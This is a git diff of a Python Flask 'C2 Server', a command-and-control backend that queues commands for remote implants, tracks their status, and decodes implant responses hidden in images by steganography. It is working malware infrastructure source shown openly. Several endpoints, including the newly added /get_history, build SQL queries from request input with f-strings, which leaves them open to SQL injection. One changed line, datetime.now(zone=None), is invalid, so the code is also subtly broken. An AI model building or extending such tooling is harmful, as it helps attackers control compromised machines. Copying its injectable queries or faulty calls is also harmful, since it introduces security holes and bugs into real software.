@@ -1,5 +1,4 @@
 # The C2 Server
-
 import os
 from datetime import datetime
 import json
@@ -14,7 +13,7 @@ from flask_jwt_extended import (JWTManager, create_access_token, get_jwt,
                                 unset_jwt_cookies)
 from psycopg2 import connect, sql
 
-import Steganography 
+import Steganography
 
 app = Flask(__name__)
 CORS(app)
@@ -79,7 +78,7 @@ def handle_execute():
     try:
         target_implant_id = int(request.form.get('target_implant_id'))
         command = request.form.get('command')
-        created_on = datetime.now().isoformat()
+        created_on = datetime.now(zone=None).isoformat()
         status = "untouched"
 
         columns = ['target_implant_id', 'command', 'created_on', 'status']
@@ -96,6 +95,8 @@ def handle_execute():
         return error, {'Access-Control-Allow-Origin': config.clientURL}
 
 # List all commands for a particular implant
+
+
 @app.route("/get_commands", methods=["POST"])
 def get_commands():
     data = request.json
@@ -111,13 +112,15 @@ def get_commands():
         return error, {'Access-Control-Allow-Origin': config.clientURL}
 
 # List untouched commands for a particular implant don't yell at me this was just the easiest to do instead of refactor client
+
+
 @app.route("/get_untouched", methods=["POST"])
 def get_untouched():
     data = request.json
     id = data['id']
     try:
         db_resp = tools.executeSelectQuery(
-            f"SELECT * FROM task_queue WHERE target_implant_id={id} AND status=\"untouched\"")
+            f"SELECT * FROM task_queue WHERE (target_implant_id={id} AND status=\"untouched\")")
         print(f"this is the db response: {db_resp}")
         return db_resp, 200, {'Access-Control-Allow-Origin': config.clientURL}
     except Exception as error:
@@ -126,13 +129,15 @@ def get_untouched():
         return error, {'Access-Control-Allow-Origin': config.clientURL}
 
 # List executing commands for a particular implant don't yell at me this was just the easiest to do instead of refactor client
+
+
 @app.route("/get_executing", methods=["POST"])
 def get_executing():
     data = request.json
     id = data['id']
     try:
         db_resp = tools.executeSelectQuery(
-            f"SELECT * FROM task_queue WHERE target_implant_id={id} AND status=\"executing\"")
+            f"SELECT * FROM task_queue WHERE (target_implant_id={id} AND status=\"executing\")")
         print(f"this is the db response: {db_resp}")
         return db_resp, 200, {'Access-Control-Allow-Origin': config.clientURL}
     except Exception as error:
@@ -141,13 +146,15 @@ def get_executing():
         return error, {'Access-Control-Allow-Origin': config.clientURL}
 
 # List executed commands for a particular implant don't yell at me this was just the easiest to do instead of refactor client
+
+
 @app.route("/get_executed", methods=["POST"])
 def get_executed():
     data = request.json
     id = data['id']
     try:
         db_resp = tools.executeSelectQuery(
-            f"SELECT * FROM task_queue WHERE target_implant_id={id} AND status=\"executed\"")
+            f"SELECT * FROM task_queue WHERE (target_implant_id={id} AND status=\"executed\")")
         print(f"this is the db response: {db_resp}")
         return db_resp, 200, {'Access-Control-Allow-Origin': config.clientURL}
     except Exception as error:
@@ -156,6 +163,8 @@ def get_executed():
         return error, {'Access-Control-Allow-Origin': config.clientURL}
 
 # Register an implant, on the implant side
+
+
 @app.route("/register_implant", methods=["POST"])
 def register_implant():
     try:
@@ -180,6 +189,8 @@ def register_implant():
         return e, {'Access-Control-Allow-Origin': config.clientURL}
 
 # Display implants
+
+
 @app.route("/display_implants", methods=["GET"])
 def display_implants():
     try:
@@ -190,23 +201,23 @@ def display_implants():
         print(f"Error displaying implants: {e}")
         return e, {'Access-Control-Allow-Origin': config.clientURL}
 
-@app.route("/response", methods=["POST"]) 
+
+@app.route("/response", methods=["POST"])
 def handle_response():
-    try: 
+    try:
         file = request.files['file']
         string_rep = Steganography.decode(Steganography.iio.imread(file))
         json.loads(string_rep)
-        
+
         # img = iio.imread("doge.png")
         # iio.imwrite("doge_encoded.png", encode(img, "HelloWorld"))
         # print(decode(iio.imread("doge_encoded.png")))
-
 
     except Exception as error:
         return error, {'Access-Control-Allow-Origin': config.clientURL}
 
 
-@app.route("/response_test", methods=["POST"]) 
+@app.route("/response_test", methods=["POST"])
 def testThis():
     try:
         file = "file not accesed"
@@ -216,8 +227,44 @@ def testThis():
         return 'yer', 200, {'Access-Control-Allow-Origin': '*'}
     except Exception as error:
         print(error)
-        return error, 401, {'Access-Control-Allow-Origin': '*'} 
-    
+        return error, 401, {'Access-Control-Allow-Origin': '*'}
+
+# Gets log history of a particular implant
+
+
+@app.route("/get_history", methods=["POST"])
+def get_history():
+    try:
+
+        data = request.json
+        id = data['id']
+        pending = tools.executeSelectQuery(
+            f"SELECT * FROM task_queue WHERE (target_implant_id={id} AND status=\'untouched\')")
+        print(f"this is pending responses: {pending}")
+
+        print(pending)
+
+        executed = tools.executeSelectQuery(
+            f"SELECT * FROM task_queue WHERE (target_implant_id={id} AND status=\'executed\')")
+        print(f"this is executed responses: {executed}")
+
+        executing = tools.executeSelectQuery(
+            f"SELECT * FROM task_queue WHERE (target_implant_id={id} AND status=\'executing\')")
+        print(f"this is executing responses: {executing}")
+        # "success": x[-3]
+        combined = [{"sender": "user", "creator":x[-1], "created_on":x[3], "command":x[2] } for x in executed]
+        print()
+        print("this is combined: " )
+        print(combined)
+        print()
+
+        return {"pending": pending}, 200, {'Access-Control-Allow-Origin': '*'}
+    except Exception as e:
+        print(e)
+        return e, {'Access-Control-Allow-Origin': '*'}
+
+
+    # Construct a linear history of commands -> responses
 
 # for testing
 # def main():
